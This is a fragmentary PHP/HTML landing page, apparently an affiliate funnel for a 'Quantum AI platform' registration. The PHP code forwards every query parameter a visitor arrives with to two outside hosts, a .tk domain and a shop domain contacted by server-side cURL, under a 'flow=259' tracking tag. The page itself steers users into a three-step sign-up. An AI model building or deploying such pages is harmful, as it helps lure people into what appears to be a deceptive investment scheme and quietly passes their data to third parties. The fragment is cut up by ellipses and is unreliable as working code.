...
?><?php
$url = "//toefundlywighca.tk/quantumai-registration/info/?flow=259&" . http_build_query($_GET);
?><!DOCTYPE html>
<html lang="en">
<head>
...
<!-- End Google Tag Manager (noscript) -->
  ...
  <div class="container">
    <div class="step-1">
      <h1 class="title">Welcome to the  <br> Quantum AI platform!</h1>
      <p class="descr">To start working you need to pass the registration process:</p>
      <img src="img/laptop.png" class="step-1__image" alt="">
      <ul class="stepper">
        <li class="active">Step 1</li>
        <li>Step 2</li>
        <li>Step 3</li>
      </ul>
      <a  href="step2.php" class="btn">REGISTRATION</a>
    </div>
  </div>
    <footer class="footer">
...
$curl = curl_init( "https://livco.shop/quantumai-registration/info/?flow=259&only=code&" . http_build_query($_GET) );
